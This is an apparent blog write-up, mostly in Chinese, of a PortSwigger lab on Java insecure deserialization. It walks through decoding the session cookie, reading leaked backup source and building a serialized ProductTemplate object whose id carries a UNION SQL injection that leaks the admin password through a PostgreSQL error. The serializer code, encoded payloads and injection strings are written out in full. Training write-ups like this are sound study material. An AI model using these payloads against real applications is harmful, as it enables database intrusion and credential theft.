---
layout: post
title: "Developing a custom gadget chain for Java deserialization"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Insecure_Deserialization
author: ""
tags: ['PortSwigger_Lab', 'Insecure_Deserialization']
---






# Developing a custom gadget chain for Java deserialization

```
This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's [insecure deserialization](https://portswigger.net/web-security/deserialization) to obtain the administrator's password.

To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the `administrator` and delete Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`

Note that solving this lab requires basic familiarity with another topic that we've covered on the [Web Security Academy](https://portswigger.net/web-security).

#### Hint

To save you some of the effort, we've provided a [generic Java program for serializing objects](https://github.com/PortSwigger/serialization-examples/tree/master/java/generic). You can adapt this to generate a suitable object for your exploit. If you don't already have a Java environment set up, you can compile and execute the program using a browser-based IDE, such as `repl.it`.






本實驗使用基於序列化的會話機制。 如果可以構建合適的gadget鏈，就可以利用本實驗室的不安全反序列化來獲取管理員密碼。

為了解決實驗室，獲取源代碼並使用它構建一個小工具鏈來獲取管理員的密碼。 然後，以管理員身份登錄並刪除 Carlos 的帳戶。

您可以使用以下憑據登錄到您自己的帳戶：wiener:peter

請注意，完成此實驗需要對我們在 Web 安全學院中介紹的另一個主題有基本的了解。
暗示

為了節省您的一些精力，我們提供了一個用於序列化對象的通用 Java 程序。 您可以對其進行調整以生成適合您的漏洞利用的對象。 如果您尚未設置 Java 環境，則可以使用基於瀏覽器的 IDE（例如 repl.it）編譯和執行程序。


```







輸入emial  並 update email
```http
POST /my-account/change-email HTTP/1.1
Host: 0a920021040d5a3ec01856e8006200ad.web-security-academy.net
Cookie: session=rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACB1MXQyaWcyajlxOGg4ODdxY3Jid25lM216Z2Z4b29kMXQABndpZW5lcg%3d%3d
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a920021040d5a3ec01856e8006200ad.web-security-academy.net
Referer: https://0a920021040d5a3ec01856e8006200ad.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=333%40333

```

session:
```
rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACB1MXQyaWcyajlxOGg4ODdxY3Jid25lM216Z2Z4b29kMXQABndpZW5lcg%3d%3d
```


base64 decode:
```
�sr�/lab.actions.common.serializable.AccessTokenUserQ'�L�accessTokent�Ljava/lang/String;L�usernameq�~�xpt� u1t2ig2j9q8h887qcrbwne3mzgfxood1t�wiener

```
以上訊息說明 跟 序列化 username  wiener 有關!!!


sitemap 找到
```
/backup/AccessTokenUser.java
```

```java
HTTP/1.1 200 OK
Set-Cookie: session=; Secure; HttpOnly; SameSite=None
Connection: close
Content-Length: 486

package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}

```

PRO 版 backup 目錄 掃描到ProductTemplate.java


發現 ProductTemplate (id) 可以引發 sql 注入:
而且還是字符型注入:
```java

HTTP/1.1 200 OK
Set-Cookie: session=; Secure; HttpOnly; SameSite=None
Connection: close
Content-Length: 1651

package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}

```


因為我看不懂java 所以使用 官方給的payload 產生器。
https://github.com/PortSwigger/serialization-examples/

```java
import data.productcatalog.ProductTemplate;

import java.io.ByteArrayInputStream;

import java.io.ByteArrayOutputStream;

import java.io.ObjectInputStream;

import java.io.ObjectOutputStream;

import java.io.Serializable;

import java.util.Base64;

class Main {

public static void main(String[] args) throws Exception {

ProductTemplate originalObject = new ProductTemplate("your-payload-here");

String serializedObject = serialize(originalObject);

System.out.println("Serialized object: " + serializedObject);

ProductTemplate deserializedObject = deserialize(serializedObject);

System.out.println("Deserialized object ID: " + deserializedObject.getId());

}

private static String serialize(Serializable obj) throws Exception {

ByteArrayOutputStream baos = new ByteArrayOutputStream(512);

try (ObjectOutputStream out = new ObjectOutputStream(baos)) {

out.writeObject(obj);

}

return Base64.getEncoder().encodeToString(baos.toByteArray());

}

private static <T> T deserialize(String base64SerializedObj) throws Exception {

try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {

@SuppressWarnings("unchecked")

T obj = (T) in.readObject();

return obj;

}

}

}

```


sql 語句:
``` sql
 String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
```



java   執行 Main

your-payload-here 改承 單引號 ' 會引發閉合，而導致sql 語法錯誤!!!

我們要先確定我們構造的payload，能不能後端能不能引發錯誤，確定有sql 注入。
```
cmd_>
javac main.java
java main

```

```
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAASc=
Deserialized object ID: '

```

放入session
postgresql 錯誤
```

java.io.IOException: org.postgresql.util.PSQLException: ERROR: unterminated quoted string at or near &quot;&apos;&apos;&apos; LIMIT 1&quot;
  Position: 35


```





而正是因為 它選取 * 所有欄位，我們需要用 union 注入去猜測它到底有多少欄位。
```
SELECT * FROM products WHERE id = '%s' LIMIT 1
```



換payload:
```
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAXycgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwsIENBU1QocGFzc3dvcmQgQVMgbnVtZXJpYyksIE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwgRlJPTSB1c2Vycy0t
Deserialized object ID: ' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--

```

postgresql 錯誤
```
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;1dg2hwg5cpxc8kgnqfdo&quot;
```

就是密碼
```
1dg2hwg5cpxc8kgnqfdo
```



登入並刪除 carlos 就可以了。




這題，因為太麻煩，很多細節都沒有研究清楚，這題其實˙蠻有趣的，只是注入的手法複雜。


有空好好研究payload 跟 jpostgresql 不然一個頭兩個大。







